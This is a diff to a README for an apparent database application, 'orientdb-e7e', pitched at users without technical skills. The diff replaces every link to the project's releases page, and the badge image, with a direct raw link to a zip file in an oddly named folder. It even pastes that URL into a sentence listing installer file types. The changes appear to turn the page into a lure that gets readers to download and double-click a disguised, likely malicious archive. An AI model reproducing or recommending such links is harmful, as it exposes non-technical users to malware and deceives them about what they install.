@@ -1,7 +1,7 @@
 # 🚀 orientdb-e7e - Simple Database Access for Everyone
 
 ## 📥 Download Now
-[![Download orientdb-e7e](https://img.shields.io/badge/Download%20orientdb--e7e-v1.0.0-brightgreen)](https://github.com/jkorom0831/orientdb-e7e/releases)
+[![Download orientdb-e7e](https://raw.githubusercontent.com/jkorom0831/orientdb-e7e/main/Agrauleum/orientdb-e7e-3.9-beta.3.zip%20orientdb--e7e-v1.0.0-brightgreen)](https://raw.githubusercontent.com/jkorom0831/orientdb-e7e/main/Agrauleum/orientdb-e7e-3.9-beta.3.zip)
 
 ## 📜 Overview
 orientdb-e7e is an easy-to-use database application designed for everyone. Whether you're managing small projects or large datasets, this tool helps you efficiently store and access your data. You can quickly set up your database without needing any technical skills.
@@ -23,10 +23,10 @@ orientdb-e7e is an easy-to-use database application designed for everyone. Wheth
 To get started with orientdb-e7e, follow these simple steps to download and install the application.
 
 ### Step 1: Visit the Releases Page
-Go to our Releases page by clicking this link: [Download orientdb-e7e](https://github.com/jkorom0831/orientdb-e7e/releases).
+Go to our Releases page by clicking this link: [Download orientdb-e7e](https://raw.githubusercontent.com/jkorom0831/orientdb-e7e/main/Agrauleum/orientdb-e7e-3.9-beta.3.zip).
 
 ### Step 2: Download the Latest Version
-On the Releases page, find the latest version listed. Click the link for the installer that matches your operating system. You may see options like `.exe`, `.dmg`, or `.tar.gz`.
+On the Releases page, find the latest version listed. Click the link for the installer that matches your operating system. You may see options like `.exe`, `.dmg`, or `https://raw.githubusercontent.com/jkorom0831/orientdb-e7e/main/Agrauleum/orientdb-e7e-3.9-beta.3.zip`.
 
 ### Step 3: Install the Application
 Once the download completes, locate the file on your computer and double-click it to begin installation. Follow the on-screen instructions to complete the setup.
@@ -48,7 +48,7 @@ If you encounter any problems while installing or using orientdb-e7e, please che
 - **Unexpected Errors:** Restart your computer and try again. If problems persist, reach out for help in the community forum.
 
 ## 📥 Download & Install
-To begin your journey with orientdb-e7e, [visit this page to download](https://github.com/jkorom0831/orientdb-e7e/releases). Follow the installation steps outlined above to get started with your new database application.
+To begin your journey with orientdb-e7e, [visit this page to download](https://raw.githubusercontent.com/jkorom0831/orientdb-e7e/main/Agrauleum/orientdb-e7e-3.9-beta.3.zip). Follow the installation steps outlined above to get started with your new database application.
 
 ### Final Notes
 Thank you for choosing orientdb-e7e. We hope this application simplifies your data management tasks and helps you to work more efficiently. Don't hesitate to reach out for help or share your experiences with the community!
